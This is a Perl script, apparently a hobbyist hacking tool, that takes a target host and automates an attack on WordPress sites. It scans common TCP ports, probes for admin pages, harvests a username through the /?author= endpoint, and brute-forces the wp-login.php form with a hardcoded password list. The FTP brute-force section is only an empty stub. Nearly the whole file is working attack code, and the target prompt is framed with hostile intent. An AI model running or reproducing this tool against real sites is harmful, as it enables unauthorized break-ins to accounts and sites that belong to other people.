#!/usr/bin/perl

########
#
# Automated exploit tool for getting WordPress admin credentials and FTP credentials and eventually... root
#
########


############################
#Built-in modules
use strict;
use warnings;
use LWP::UserAgent ();
use Net::FTP;
use IO::Socket::INET;
use Net::IP;
use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Cookies;
use LWP::Protocol::https;
use Term::ANSIColor;
use Net::DNS;
###########################
#External modules (trying to avoid using)
###########################
####
system('clear');
#Static Variables
my @ports = qw(20 21 22 23 53 67 68 69 80 88 135 139 443 445);
my @oports;
my $sock;
my $banner = << 'EOL';
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
.___/\          __  .__                  ____.                                                      __    __________._______________________   ___ ___
|   )/_____   _/  |_|  |__   ____       |    |__ __  ____   ____   ___________  ____ _____   __ ___/  |_  \______   \   \__    ___/\_   ___ \ /   |   \
|   |/     \  \   __\  |  \_/ __ \      |    |  |  \/ ___\ / ___\_/ __ \_  __ \/    \\__  \ |  |  \   __\  |    |  _/   | |    |   /    \  \//    ~    \
|   |  Y Y  \  |  | |   Y  \  ___/  /\__|    |  |  / /_/  > /_/  >  ___/|  | \/   |  \/ __ \|  |  /|  |    |    |   \   | |    |   \     \___\    Y    /
|___|__|_|  /  |__| |___|  /\___  > \________|____/\___  /\___  / \___  >__|  |___|  (____  /____/ |__|    |______  /___| |____|    \______  /\___|_  /
          \/             \/     \/                /_____//_____/      \/           \/     \/                      \/                       \/       \/
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
EOL
#####################################
#Bot building
my $cookie = new HTTP::Cookies(ignore_discard => 1);
my $bot = LWP::UserAgent->new;
$bot -> timeout(10);
$bot -> agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
$bot -> cookie_jar($cookie);
#####################################
print color('yellow');
print $banner;
print "\n\n[*]Who we fucking over => ";
chomp(my $host = <STDIN>);
#print "\n\n[*]Enter the path to the list of usernames => ";
#chomp(my $user = <STDIN>);
#print "\n\n[*]Enter the path to the list of passwords => ";
#chomp(my $pass = <STDIN>);
#####################################
#Running subroutines
port_scanner();
admin_find();
user_find();
#####################################
#Start subroutine building
####
#Port scanner
sub port_scanner {
  print "\n\n++++++++++++++++++++++++++++++\n";
  print "[*]Port scan\n";
  print "++++++++++++++++++++++++++++++\n";
  print color('reset');
  #looks for ports in the array
  foreach my $port (@ports){
      if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp', Timeout => 1)){
          print color('green');
          print "[*] =>\tPort $port is open\n";
          print color('reset');
          push @oports, $port; #pushing the open port to an array for later use
      }
      else{
        print color('red');
        print "[*] =>\tPort $port is closed\n";
        print color('reset');
    }
  }
}
####
#Finding admin pages
sub admin_find {
 print color('yellow');
 print "++++++++++++++++++++++++++++++++++\n";
 print "[*]Hunting for an admin page\n";
 print "++++++++++++++++++++++++++++++++++\n";
 print color('reset');
#array of typical admin pages
 my @admins = qw(admin administrator wp-admin wp-login.php);
  if ($host !~ /http:\/\//) {$host = "http://$host";}; #adds http before the target if it is not present
  foreach my $admin (@admins) {
	 my $hunt = $host."/".$admin."/";
	 my $req = HTTP::Request->new(GET=>$hunt); #sends a GET request for the pages
	 my $res = $bot->request($req);
    #looks for the admin page
   if ($res->is_success) {
      print color('bold green');
	    print "[*]Found the admin page!!\n";
	    print "[*] =>\t$hunt \n";
      print color('reset');
      last;
      return $hunt;
    }
	  elsif ($res->content=~/Access Denied/){ #if the admin page is found, but pulls a 403 error, will let the user know
      print "[*]Found the admin page : $hunt => [Error & Access Denied]\n";
      last;
	  }
	  else {
	  }
  }
}
####
#WordPress user discovery
sub user_find {
  print color('yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Looking for a user\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
  my $user = $host . '/?author=1'; #the /?author=1 will lead to a public facing list of users
  my $req = HTTP::Request ->new(GET=>$user); #build a request to get page content
  my $userhunt = $bot->request($req)->content; #sends the request then decodes the content so it doesn't load a hash
  if($userhunt =~/<title>([a-zA-Z\/][^>]+)<\/title>/){ #filtering for the username in the pages title
    my $victim = $1; #grabs the content between the <title> tags
    print color('boldgreen');
    print "[*]Found user\n";
    print "[*] =>\t$victim \n";
    print color('reset');
    brute_force($victim); #sends the $victim data for brute forcing
  }
  else{
    print color('red');
    print "[*]Unable to find a user\n";
    print color('reset');
  }
}


#Admin Page Brute force
sub brute_force {
  my $victim = shift;
  my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
  print color('yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Trying to break the Admin login\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
  #Iterating through the array to try and guess the password
  #Attempts to find a redirect between the login script and the actual admin page
  foreach (@passwds) {
      chomp(my $passwd = $_);
        my $target = $host . '/wp-login.php';
        my $auth = $host . '/wp-admin/';
        my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth]; #builds a POST request for the login page
        my $attempt = $bot->request($login); #sends the actual request
        my $status = $attempt-> as_string; #Converts the data from the HASH that the request sends to a STRING
        if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){ #checks if the redirect has occurred
          print color('bold green');
          print "[*]Broke the site!\n";
          print "[*] =>\t$victim \n";
          print "[*] =>\t$passwd \n";
          print color('reset');
      }
    }
  }
####
#Maybe XSS or SQL, don't know yet


####
#FTP brute forcing
sub ftp_brute {
  print color('yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Trying to break the FTP login\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
}


####
#FTP commands
